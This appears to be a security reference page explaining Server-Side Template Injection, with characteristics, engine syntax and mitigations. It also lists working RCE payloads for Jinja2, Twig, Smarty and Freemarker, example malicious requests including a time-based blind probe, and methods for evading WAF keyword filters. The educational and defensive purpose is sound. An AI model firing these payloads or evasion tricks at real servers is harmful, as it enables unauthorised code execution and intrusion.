# Attack Classes - SSTI
 
Server-Side Template Injection (SSTI) is an attack where user-controlled input is embedded directly into a server-side template and evaluated by the template engine instead of being treated as static data.
A web application is vulnerable to SSTI if it concatenates unsanitized user input into a template string before rendering it, allowing an attacker to inject native template syntax that the engine executes.

These user-supplied inputs can be:
- URL parameters.
- Form fields.
- HTTP headers.
- Cookies.
- File upload filenames.


This attack is different from reflected XSS, which executes injected code in the victim's browser. In SSTI the injected expressions are evaluated entirely on the server, granting the attacker the same level of access as the application process itself, up to and including Remote Code Execution (RCE).


## Characterisitics

- User-supplied data passed directly into a template string before rendering.
- Uses template engine expression syntax to break out of the data context into the code context.
- Can lead to remote code execution (RCE) by traversing the engine's object model.
- Engine-specific syntax (Jinja2, Twig, Freemarker, Smarty, Velocity, etc.).
- Exploits the trust an application places in its own template rendering layer.
- Often requires encoding or string fragmentation to bypass WAF signature matching.

## Common Special Characters

- `{{` `}}` - expression block (Jinja2, Twig, Pebble, Handlebars)
- `${` `}` - expression syntax (Freemarker, Mako, Spring EL)
- `#{` `}` - expression syntax (Thymeleaf, Ruby ERB)
- `<%` `%>` - scriptlet block (ERB, Mako, ASP-style)
- `{%` `%}` - statement block (Jinja2, Twig)
- `*{` `}` - selection expression (Thymeleaf)
- `.` - attribute/method access operator used in object traversal chains
- `__` - double underscore prefix signaling Python dunder attributes

### Common Payloads
 
Here are common SSTI payloads organized by stage:
 
**Probe / Confirmation:**
```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
*{7*7}
${{7*7}}
```
 
**Object Introspection (Jinja2 / Python):**
```
{{''.__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__}}
```
 
**RCE (Jinja2 — via built-in objects):**
```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
 
**RCE (Twig / PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
 
**RCE (Smarty / PHP):**
```
{system('id')}
{passthru('cat /etc/passwd')}
```
 
**RCE (Freemarker / Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Payload Examples
 
[BENIGN]
GET /profile?name=Alice HTTP/1.1
Host: target.example.com
 
[MALICIOUS] *Arithmetic Probe*
GET /profile?name={{7*7}} HTTP/1.1
Host: target.example.com
 
[MALICIOUS] *Python Object Traversal*
GET /profile?name={{''.__class__.__mro__[1].__subclasses__()}} HTTP/1.1
Host: target.example.com
 
[MALICIOUS] *RCE via Jinja2 Built-in Object*
GET /profile?name={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
 
[MALICIOUS] *Freemarker RCE via Execute Gadget*
GET /profile?name=<#assign+ex%3d"freemarker.template.utility.Execute"%3fnew()>${ex("id")} HTTP/1.1
Host: target.example.com
 
[MALICIOUS] *Blind SSTI via Time Delay*
GET /profile?name={{''.__class__.__mro__[1].__subclasses__()[396]('sleep+5',shell=True).wait()}} HTTP/1.1
Host: target.example.com
 
### Obfuscation Techniques
 
- String Concatenation: Splitting a blocked keyword across string concatenation operations causes signature matchers looking for the complete token to miss it. The template engine reassembles the full attribute name at evaluation time before the block list can intervene.

| Technique | Raw payload | Obfuscated form | Bypasses keyword match |
|-----------|-------------|-----------------|------------------------|
| String split | `__class__` | `'__cla'+'ss__'` | Yes |
| String split | `__mro__` | `'__m'+'ro__'` | Yes |
| Index notation | `.os` | `['os']` | Yes (dot-access rules) |
| Nested concatenation | `popen` | `'po'+'pen'` | Yes |
 
- `attr()` Filter Access: The Jinja2 `attr()` filter retrieves an attribute by name and bypasses dot-notation rules. Passing the attribute name as a string argument evades patterns that look for `.__class__` directly, and the string argument can itself be hex-encoded to defeat secondary keyword checks.

| Access form | Syntax | Bypasses dot-notation filter |
|-------------|--------|------------------------------|
| Direct dot access | `''.__class__` | No |
| `attr()` filter | `''|attr('__class__')` | Yes |
| `attr()` with hex string | `''|attr('\x5f\x5fclass\x5f\x5f')` | Yes |
| `attr()` with concat | `''|attr('__cla'+'ss__')` | Yes |
 
- Hex / Unicode Encoding: The underscore character (`_`) encodes as `\x5f` in hex. Because dunder attribute names begin and end with double underscores, encoding them as `\x5f\x5f` causes WAF keyword filters scanning for `__` to find nothing while the template engine decodes and evaluates the attribute name at runtime.

| Encoding Level | Encoded value | Decoded value | Bypasses |
|----------------|---------------|---------------|----------|
| Hex (single) | `\x5f\x5f` | `__` | Yes |
| Hex attribute | `'\x5f\x5fclass\x5f\x5f'` | `__class__` | Yes |
| URL (single) | `%7b%7b7*7%7d%7d` | `{{7*7}}` | Yes |
| Double URL | `%257b%257b7*7%257d%257d` | `%7b%7b7*7%7d%7d` → `{{7*7}}` | Yes |
 
- Polyglot Probes: A single payload embeds multiple engine syntaxes simultaneously, testing for Jinja2, Freemarker, and Smarty in one request. A positive evaluation in any one engine reveals which template engine the server is running and confirms the injection point.

| Probe | Engines targeted | Confirms engine if response contains |
|-------|-----------------|--------------------------------------|
| `${7*7}{{7*7}}` | Freemarker + Jinja2 | `49` anywhere in output |
| `{{7*'7'}}` | Jinja2 (`49`) vs Twig (`7777777`) | Integer vs string multiplication |
| `a{*comment*}b` | Smarty | `ab` (comment stripped) |
| `#{7*7}` | Thymeleaf / Ruby ERB | `49` |
 
 
## Mitigations
 
- Input Validation: Treat all user input as untrusted data, never as template code. Use an allow list of permitted characters for each input field and reject anything outside that set before it reaches the rendering layer.
- Avoid Template String Concatenation: Never build template strings by concatenating user input at the code level. Pass user data as template variables in a separate context dictionary so the engine renders it as a literal value rather than evaluating it as an expression.
- Use Logic-less or Sandboxed Templates: Prefer logic-less template engines (e.g., Mustache) that do not support arbitrary expression evaluation. If a full-featured engine is required, enable its sandbox mode to restrict access to built-in objects, file system calls, and reflection APIs.
- Least Privilege: Run all application services with the minimum permissions necessary. If SSTI leads to RCE, OS-level constraints (no shell access, read-only filesystem, network egress rules) limit the blast radius of a successful exploit.



**References:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html) · [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/) · [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)